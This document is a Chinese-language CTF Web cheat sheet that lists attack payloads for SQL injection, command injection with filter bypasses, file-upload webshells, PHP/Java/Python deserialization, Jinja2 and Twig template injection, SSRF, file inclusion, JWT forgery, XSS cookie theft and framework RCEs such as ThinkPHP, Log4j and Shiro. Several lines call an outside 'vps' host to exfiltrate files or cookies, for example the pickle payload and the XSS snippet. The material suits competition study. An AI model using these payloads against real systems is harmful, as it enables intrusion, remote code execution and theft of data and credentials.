# Web 方向解题参考

## 1. 信息收集与初步侦察

```bash
# 目录/路径扫描
dirsearch -u http://target -e php,html,js,zip,bak,git -t 30
gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt -x php,bak,zip
ffuf -u http://target/FUZZ -w wordlist.txt -mc 200,301,302,403

# 指纹识别
whatweb http://target
# 查看响应头: X-Powered-By, Server, Set-Cookie 特征

# 常见敏感路径
/.git/  /.svn/  /.DS_Store  /robots.txt  /index.php.bak  /www.zip  /.env  /composer.json
# git 泄露利用
git-dumper http://target/.git/ ./repo    # 或 Githacker
```

## 2. SQL 注入

```bash
sqlmap -u "http://target/?id=1" --batch --dbs
sqlmap -u "http://target/?id=1" --batch -D dbname --tables
sqlmap -u "http://target/?id=1" --batch -D dbname -T tablename --dump
# POST 请求: --data "user=admin&pass=1"
# 带 Cookie: --cookie "session=xxx"
# tamper 绕 WAF: --tamper=space2comment,between
# 尝试 --level=3 --risk=2 提高检测强度
```

### 手工注入要点
- 判断闭合方式：`id=1'`、`id=1"`、`id=1')`，观察报错/布尔差异
- 联合查询：`ORDER BY` 探列数 → `UNION SELECT 1,2,3` 找回显位
- 报错注入：`extractvalue(1,concat(0x7e,database()))`、`updatexml()`
- 布尔/时间盲注：`if(ascii(substr(database(),1,1))>100,sleep(3),0)`
- MySQL 读文件：`LOAD_FILE('/flag')`；写 WebShell：`INTO OUTFILE`
- SQLite：`sqlite_master` 查表名；无 information_schema 时用 `sys.` 或 MySQL8 的 `mysql.innodb_table_stats`

## 3. 命令注入 / 代码执行

```php
// 常见危险函数
system, exec, shell_exec, passthru, popen, proc_open, eval, assert, preg_replace(/e), create_function, call_user_func, include, require
```
- 绕过空格：`$IFS$9`、`${IFS}`、`<`、`%09`
- 绕过关键字：`ca''t`、`ca\t`、变量拼接 `a=ca;b=t;$a$b`、Base64 编码 `echo Y2F0IC9mbGFn|base64 -d`
- 绕过目录：`/???/?????`、`cd /;cat flag`
- 无回显：反弹 shell 或 `curl http://vps/?a=$(cat /flag)`

## 4. 文件上传

- 客户端校验 → Burp 改包绕过
- MIME 类型 → 修改 Content-Type: image/png
- 黑名单绕过：`.php5` `.phtml` `.pht` `.Php`（大小写）`.php.`（末尾点）`.php%00`（截断，老版本）
- `.htaccess` 上传：`AddType application/x-httpd-php .png` 后上传 png 马
- 图片马：`copy /b a.png+b.php out.png`（Windows）或 GIF89A 文件头
- 条件竞争：不断上传+访问

## 5. 反序列化

### PHP
```php
// 序列化格式: O:4:"Test":1:{s:3:"cmd";s:6:"whoami";}
// 魔术方法利用链: __destruct / __wakeup / __toString / __call / __get
// 绕过 __wakeup: 属性个数改大 (CVE-2016-7124, PHP<5.6.25)
// 字符串逃逸: 过滤函数导致的长度变化 (str_replace)
// phar 反序列化: phar://xxx.jpg 可触发 (需 phar.readonly=Off)
// 常见链: ThinkPHP (tp5 tp6 RCE), Laravel (POP 链), Yii, Monolog
```
工具：phpggc（生成各框架反序列化 payload）

### Java / Python
- Java：ysoserial（CommonsCollections 系列、CB、Hibernate）
- Python：pickle payload：`__reduce__` 返回 `(os.system, ('curl http://vps/?a=`cat /flag`',))`
- 漏洞识别：Java `AC ED 00 05` 头 / Base64 `rO0AB`；`Content-Type: application/x-java-serialized-object`

## 6. SSTI 模板注入

```
// 检测: {{7*7}} → 49 表示存在注入
// Jinja2 (Python/Flask):
{{ config }}  {{ config.SECRET_KEY }}
{{ ''.__class__.__mro__[1].__subclasses__() }}
{{ url_for.__globals__['__builtins__']['eval']('__import__("os").popen("cat /flag").read()') }}
{{ lipsum.__globals__['os'].popen('cat /flag').read() }}
{{ cycler.__init__.__globals__.os.popen('id').read() }}
// 绕过: {%%20print(...)%20%%}、"__getattribute__"、chr() 拼接、|attr() 过滤器
// Twig (PHP): {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /flag")}}
```

## 7. SSRF

- 探测内网：`http://127.0.0.1`、`http://192.168.0.1/24`、`dict://`、`gopher://`
- 绕过限制：`0x7f000001`、`127.1`、`0177.0.0.1`、`@` 符号、DNS rebinding、302 跳转
- 攻击 Redis（未授权）：gopher 协议写 crontab/写 WebShell/主从复制 RCE
- 云环境元数据：`http://169.254.169.254/latest/meta-data/`（AWS）

## 8. 文件包含 / LFI / RFI

```php
// PHP 伪协议
php://filter/read=convert.base64-encode/resource=index.php   // 读源码
php://input + POST 数据                                        // 执行代码(需 allow_url_include)
data://text/plain,<?php phpinfo();?>
zip:// / phar:// / compress.zlib://
// 路径穿越: ../../../../etc/passwd
// 日志包含: /var/log/nginx/access.log (UA 写入一句话)
// session 包含: /tmp/sess_xxx (PHP_SESSION_UPLOAD_PROGRESS 竞争)
```

## 9. JWT

```
// 结构: header.payload.signature
// 攻击面:
1. none 算法: {"alg":"none"} 并去掉签名
2. 算法混淆: RS256 → HS256, 用公钥作为 HMAC 密钥
3. 弱密钥: jwt_tool / hashcat 爆破
   hashcat -m 16500 jwt.txt rockyou.txt
4. kid 注入: kid 指向 /dev/null 或 SQL 注入
5. 过期时间篡改 / exp 未校验
// 工具: jwt_tool (https://github.com/ticarpi/jwt_tool)
```

## 10. XSS / CSRF / 前端

- XSS 类型：反射/存储/DOM；利用：偷 Cookie `document.location='http://vps/?c='+document.cookie`
- DOM XSS 关注：`innerHTML`、`eval`、`document.write`、`location` 污染点
- CSP 绕过：`unsafe-inline`、JSONP 端点、dangling markup 注入
- 前端框架注入：Vue `{{constructor.constructor('alert(1)')()}}`、Angular `{{7*7}}`

## 11. 常见考点速查

| 特征 | 可能考点 |
|------|---------|
| `?file=` | 文件包含/LFI |
| `md5`/`sha1` 比较 | 数组绕过 `a[]=1`，`==` 弱比较 `0e` 开头科学计数法 |
| `preg_match` | 换行 `%0a` 绕过、`/m` 修饰符 |
| `intval` | 进制绕过 `0x`、小数、负数 |
| `strpos` | 换行绕过 |
| `in_array` | 松散比较、第三参数未设 true |
| `strcmp` | 数组绕过返回 null |
| `switch/if` 弱类型 | `==` 各种绕过 |
| open_basedir | `chdir+ini_set` 绕过 / glob 协议 |
| disable_functions | LD_PRELOAD、imap_open、FPM/Fastcgi、Apache mod_cgi |
| 无数字字母 WebShell | 异或 `^`、取反 `~`、自增 `++` |
| Node.js | 原型链污染 `__proto__`、vm 沙箱逃逸 |
| Go | jwt/hardcoded token |

## 12. 框架漏洞利用

- **ThinkPHP**：TP5 `s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id`
- **Log4j**（Java）：`${jndi:ldap://vps/exp}`
- **Shiro**：rememberMe 反序列化（默认 key `kPH+bIxk5D2deZiIxcaaaA==`）
- **Fastjson**：`@type` 反序列化，各版本 payload
- **Struts2**：OGNL 注入
- **Spring**：Spring4Shell、Spring Cloud Gateway SpEL
